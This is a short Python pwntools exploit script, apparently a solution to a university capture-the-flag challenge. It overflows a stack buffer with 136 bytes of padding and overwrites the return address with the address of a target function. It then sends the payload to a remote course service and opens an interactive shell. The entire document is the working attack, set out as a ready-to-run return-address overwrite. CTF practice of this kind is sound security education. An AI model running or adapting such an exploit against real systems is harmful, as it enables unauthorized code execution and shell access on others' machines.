from pwn import *

target_function_address = 0x00000000_00401209  # Address of target function

# Construct the payload
payload = b'A' * 128 + b'B' * 8 + p64(target_function_address)

# Connect to the remote service
p = remote("cs2107-ctfd-i.comp.nus.edu.sg", 5001)

# Send the payload
p.sendline(payload)

# Drop into interactive mode to access the shell
p.interactive()

